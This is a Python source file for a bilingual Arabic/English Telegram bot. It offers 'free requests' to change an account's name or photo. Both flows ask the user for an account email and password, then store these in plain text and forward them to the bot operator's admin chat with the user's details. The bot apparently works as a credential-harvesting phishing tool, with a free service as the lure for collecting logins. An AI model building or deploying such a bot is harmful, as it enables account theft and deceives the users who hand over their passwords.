from aiogram import Dispatcher, types
from aiogram.dispatcher import FSMContext
from database import db
from keyboards import get_yes_no_keyboard, get_main_keyboard, get_order_admin_keyboard
from states import ChangeNameStates, ChangePhotoStates
from config import ADMIN_ID, TIMEZONE
from datetime import datetime
from utils.timeout_manager import timeout_manager
from utils.helpers import validate_email, sanitize_input, safe_json_dumps, is_rate_limited
import json

# ========== FSM Data Keys ==========
FSM_NEW_NAME = "new_name"
FSM_NEW_EMAIL = "new_email"
FSM_NEW_PASSWORD = "new_password"
FSM_PHOTO_ID = "photo_id"
FSM_PHOTO_EMAIL = "photo_email"
FSM_PHOTO_PASSWORD = "photo_password"


async def show_free_orders(message: types.Message, state: FSMContext):
    """Display free orders menu"""
    user_id = message.from_user.id
    lang = db.get_user_language(user_id)

    if db.is_user_banned(user_id):
        await message.answer("🚫 تم حظرك من البوت" if lang == 'ar' else "🚫 You are banned", parse_mode='Markdown')
        return

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("✏️ تغيير الاسم" if lang == 'ar' else "✏️ Change Name", callback_data="change_name"),
        types.InlineKeyboardButton("🖼 تغيير الصورة" if lang == 'ar' else "🖼 Change Photo", callback_data="change_photo"),
        types.InlineKeyboardButton("📌 المزيد" if lang == 'ar' else "📌 More", callback_data="more_options"),
        types.InlineKeyboardButton("🔙 رجوع" if lang == 'ar' else "🔙 Back", callback_data="back_main")
    )
    await message.answer(
        "🎉 الطلبات المجانية" if lang == 'ar' else "🎉 Free Requests",
        reply_markup=markup
    )


# ========== Change Name Flow ==========
async def change_name_start(callback_query: types.CallbackQuery, state: FSMContext):
    """Start change name process - ask about 5000 coins"""
    user_id = callback_query.from_user.id
    lang = db.get_user_language(user_id)

    if db.is_user_banned(user_id):
        await callback_query.answer("🚫 تم حظرك" if lang == 'ar' else "🚫 You are banned", show_alert=True)
        return

    await callback_query.message.edit_text(
        "💰 هل لديك 5000 كوينز؟" if lang == 'ar' else "💰 Do you have 5000 coins?",
        reply_markup=get_yes_no_keyboard()
    )
    await ChangeNameStates.CHECK_BALANCE.set()
    await callback_query.answer()


async def change_name_yes(callback_query: types.CallbackQuery, state: FSMContext):
    """User confirmed they have 5000 coins - ask for new name"""
    await callback_query.message.edit_text(
        "✏️ أرسل الاسم الجديد:" if db.get_user_language(callback_query.from_user.id) == 'ar' else "✏️ Send new name:",
        reply_markup=None
    )
    await ChangeNameStates.WAITING_NAME.set()
    await callback_query.answer()


async def change_name_no(callback_query: types.CallbackQuery, state: FSMContext):
    """User doesn't have 5000 coins - cancel"""
    lang = db.get_user_language(callback_query.from_user.id)
    await state.finish()
    await callback_query.message.edit_text(
        "❌ تم الإلغاء" if lang == 'ar' else "❌ Cancelled",
        reply_markup=get_main_keyboard(lang)
    )
    await callback_query.answer()


async def change_name_get_name(message: types.Message, state: FSMContext):
    """Receive new name from user"""
    user_id = message.from_user.id
    lang = db.get_user_language(user_id)

    if is_rate_limited(user_id, 'change_name', limit=3, window=60):
        await message.answer(
            "⚠️ أرسلت طلبات كثيرة، انتظر قليلاً" if lang == 'ar' else "⚠️ Too many requests, please wait",
            reply_markup=get_main_keyboard(lang)
        )
        await state.finish()
        return

    new_name = sanitize_input(message.text, max_length=50)
    if not new_name:
        await message.answer(
            "⚠️ الاسم غير صالح، حاول مرة أخرى" if lang == 'ar' else "⚠️ Invalid name, try again",
            reply_markup=get_main_keyboard(lang)
        )
        await state.finish()
        return

    await state.update_data({FSM_NEW_NAME: new_name})
    await message.answer(
        "📧 أرسل البريد الإلكتروني:" if lang == 'ar' else "📧 Send email:"
    )
    await ChangeNameStates.WAITING_EMAIL.set()


async def change_name_get_email(message: types.Message, state: FSMContext):
    """Receive email from user"""
    user_id = message.from_user.id
    lang = db.get_user_language(user_id)
    email = sanitize_input(message.text, max_length=100)

    if not validate_email(email):
        await message.answer(
            "⚠️ البريد الإلكتروني غير صالح، أعد المحاولة" if lang == 'ar' else "⚠️ Invalid email, try again"
        )
        return

    await state.update_data({FSM_NEW_EMAIL: email})
    await message.answer(
        "🔑 أرسل كلمة المرور:" if lang == 'ar' else "🔑 Send password:"
    )
    await ChangeNameStates.WAITING_PASSWORD.set()


async def change_name_get_password(message: types.Message, state: FSMContext):
    """Receive password and create order"""
    user_id = message.from_user.id
    lang = db.get_user_language(user_id)

    data = await state.get_data()
    new_name = data.get(FSM_NEW_NAME)
    email = data.get(FSM_NEW_EMAIL)
    password = sanitize_input(message.text, max_length=100)

    if not new_name or not email:
        await message.answer(
            "⚠️ حدث خطأ، ابدأ من جديد" if lang == 'ar' else "⚠️ Error, please start over",
            reply_markup=get_main_keyboard(lang)
        )
        await state.finish()
        return

    order_data_dict = {
        'new_name': new_name,
        'email': email,
        'password': password
    }
    order_data = safe_json_dumps(order_data_dict)
    order_number = db.create_order(user_id, 'تغيير الاسم', order_data)

    await timeout_manager.set_timeout(order_number, user_id, message.bot)

    await message.answer(
        "⚡ جاري تنفيذ طلبك..." if lang == 'ar' else "⚡ Processing your request...",
        reply_markup=get_main_keyboard(lang)
    )

    user_info = db.get_user_info(user_id)
    now = datetime.now(TIMEZONE)
    remaining = await timeout_manager.get_remaining_time(order_number)

    admin_msg_lines = [
        f"✏️ **طلب تغيير اسم جديد**",
        f"📌 **رقم:** {order_number}",
        f"👤 **الاسم:** {user_info['name'] if user_info else 'غير معروف'}",
        f"🆔 **المعرف:** {user_id}",
        f"📝 **اليوزر:** @{user_info['username'] if user_info else 'لا يوجد'}",
        f"🗣️ **اللغة:** {db.get_user_language(user_id)}",
        f"🌍 **البلد:** {user_info['country'] if user_info else 'غير معروف'}",
        f"📛 **الاسم الجديد:** {new_name}",
        f"📧 **البريد:** {email}",
        f"🔑 **كلمة المرور:** {password}",
        f"📅 **التاريخ:** {now.strftime('%Y-%m-%d %H:%M:%S')}",
        f"⏰ **المدة المتبقية:** {remaining} دقيقة"
    ]
    admin_msg = "\n".join(admin_msg_lines)

    await message.bot.send_message(
        ADMIN_ID,
        admin_msg,
        reply_markup=get_order_admin_keyboard(order_number, user_id),
        parse_mode='Markdown'
    )

    await state.finish()


# ========== Change Photo Flow ==========
async def change_photo_start(callback_query: types.CallbackQuery, state: FSMContext):
    """Start change photo process"""
    user_id = callback_query.from_user.id
    lang = db.get_user_language(user_id)

    if db.is_user_banned(user_id):
        await callback_query.answer("🚫 تم حظرك" if lang == 'ar' else "🚫 You are banned", show_alert=True)
        return

    await callback_query.message.edit_text(
        "🖼 هل تريد تغيير صورتك؟" if lang == 'ar' else "🖼 Do you want to change your photo?",
        reply_markup=get_yes_no_keyboard()
    )
    await ChangePhotoStates.CHECK_BALANCE.set()
    await callback_query.answer()


async def change_photo_yes(callback_query: types.CallbackQuery, state: FSMContext):
    """User confirmed - ask for photo"""
    await callback_query.message.edit_text(
        "📸 أرسل الصورة الجديدة:" if db.get_user_language(callback_query.from_user.id) == 'ar' else "📸 Send new photo:",
        reply_markup=None
    )
    await ChangePhotoStates.WAITING_PHOTO.set()
    await callback_query.answer()


async def change_photo_no(callback_query: types.CallbackQuery, state: FSMContext):
    """User cancelled"""
    lang = db.get_user_language(callback_query.from_user.id)
    await state.finish()
    await callback_query.message.edit_text(
        "❌ تم الإلغاء" if lang == 'ar' else "❌ Cancelled",
        reply_markup=get_main_keyboard(lang)
    )
    await callback_query.answer()


async def change_photo_get_photo(message: types.Message, state: FSMContext):
    """Receive photo from user"""
    user_id = message.from_user.id
    lang = db.get_user_language(user_id)

    if not message.photo:
        await message.answer(
            "⚠️ الرجاء إرسال صورة" if lang == 'ar' else "⚠️ Please send a photo"
        )
        return

    photo_id = message.photo[-1].file_id
    await state.update_data({FSM_PHOTO_ID: photo_id})
    await message.answer(
        "📧 أرسل البريد الإلكتروني:" if lang == 'ar' else "📧 Send email:"
    )
    await ChangePhotoStates.WAITING_EMAIL.set()


async def change_photo_get_email(message: types.Message, state: FSMContext):
    """Receive email for photo change"""
    user_id = message.from_user.id
    lang = db.get_user_language(user_id)
    email = sanitize_input(message.text, max_length=100)

    if not validate_email(email):
        await message.answer(
            "⚠️ البريد الإلكتروني غير صالح، أعد المحاولة" if lang == 'ar' else "⚠️ Invalid email, try again"
        )
        return

    await state.update_data({FSM_PHOTO_EMAIL: email})
    await message.answer(
        "🔑 أرسل كلمة المرور:" if lang == 'ar' else "🔑 Send password:"
    )
    await ChangePhotoStates.WAITING_PASSWORD.set()


async def change_photo_get_password(message: types.Message, state: FSMContext):
    """Receive password and create order"""
    user_id = message.from_user.id
    lang = db.get_user_language(user_id)

    data = await state.get_data()
    photo_id = data.get(FSM_PHOTO_ID)
    email = data.get(FSM_PHOTO_EMAIL)
    password = sanitize_input(message.text, max_length=100)

    if not photo_id or not email:
        await message.answer(
            "⚠️ حدث خطأ، ابدأ من جديد" if lang == 'ar' else "⚠️ Error, please start over",
            reply_markup=get_main_keyboard(lang)
        )
        await state.finish()
        return

    order_data_dict = {
        'photo_id': photo_id,
        'email': email,
        'password': password
    }
    order_data = safe_json_dumps(order_data_dict)
    order_number = db.create_order(user_id, 'تغيير الصورة', order_data)

    await timeout_manager.set_timeout(order_number, user_id, message.bot)

    await message.answer(
        "⚡ جاري تنفيذ طلبك..." if lang == 'ar' else "⚡ Processing your request...",
        reply_markup=get_main_keyboard(lang)
    )

    user_info = db.get_user_info(user_id)
    now = datetime.now(TIMEZONE)
    remaining = await timeout_manager.get_remaining_time(order_number)

    admin_msg_lines = [
        f"🖼 **طلب تغيير صورة جديد**",
        f"📌 **رقم:** {order_number}",
        f"👤 **الاسم:** {user_info['name'] if user_info else 'غير معروف'}",
        f"🆔 **المعرف:** {user_id}",
        f"📝 **اليوزر:** @{user_info['username'] if user_info else 'لا يوجد'}",
        f"🗣️ **اللغة:** {db.get_user_language(user_id)}",
        f"🌍 **البلد:** {user_info['country'] if user_info else 'غير معروف'}",
        f"📧 **البريد:** {email}",
        f"🔑 **كلمة المرور:** {password}",
        f"📅 **التاريخ:** {now.strftime('%Y-%m-%d %H:%M:%S')}",
        f"⏰ **المدة المتبقية:** {remaining} دقيقة"
    ]
    admin_msg = "\n".join(admin_msg_lines)

    await message.bot.send_message(
        ADMIN_ID,
        admin_msg,
        reply_markup=get_order_admin_keyboard(order_number, user_id),
        parse_mode='Markdown'
    )

    await state.finish()


async def more_options(callback_query: types.CallbackQuery):
    """Show more options menu"""
    user_id = callback_query.from_user.id
    lang = db.get_user_language(user_id)

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("📞 تواصل بنا" if lang == 'ar' else "📞 Contact Us", callback_data="contact_us"),
        types.InlineKeyboardButton("🔙 رجوع" if lang == 'ar' else "🔙 Back", callback_data="back_main")
    )

    await callback_query.message.edit_text(
        "📌 المزيد" if lang == 'ar' else "📌 More",
        reply_markup=markup
    )
    await callback_query.answer()


# ========== Register Handlers ==========
def register_free_orders_handlers(dp: Dispatcher):
    """Register all free orders handlers"""
    dp.register_message_handler(show_free_orders, lambda m: m.text in ['🎉 الطلبات المجانية', '🎉 Free Requests'], state='*')
    dp.register_callback_query_handler(change_name_start, lambda c: c.data == 'change_name', state='*')
    dp.register_callback_query_handler(change_name_yes, lambda c: c.data == 'yes', state=ChangeNameStates.CHECK_BALANCE)
    dp.register_callback_query_handler(change_name_no, lambda c: c.data == 'no', state=ChangeNameStates.CHECK_BALANCE)
    dp.register_message_handler(change_name_get_name, state=ChangeNameStates.WAITING_NAME)
    dp.register_message_handler(change_name_get_email, state=ChangeNameStates.WAITING_EMAIL)
    dp.register_message_handler(change_name_get_password, state=ChangeNameStates.WAITING_PASSWORD)
    dp.register_callback_query_handler(change_photo_start, lambda c: c.data == 'change_photo', state='*')
    dp.register_callback_query_handler(change_photo_yes, lambda c: c.data == 'yes', state=ChangePhotoStates.CHECK_BALANCE)
    dp.register_callback_query_handler(change_photo_no, lambda c: c.data == 'no', state=ChangePhotoStates.CHECK_BALANCE)
    dp.register_message_handler(change_photo_get_photo, content_types=['photo'], state=ChangePhotoStates.WAITING_PHOTO)
    dp.register_message_handler(change_photo_get_email, state=ChangePhotoStates.WAITING_EMAIL)
    dp.register_message_handler(change_photo_get_password, state=ChangePhotoStates.WAITING_PASSWORD)
    dp.register_callback_query_handler(more_options, lambda c: c.data == 'more_options', state='*')
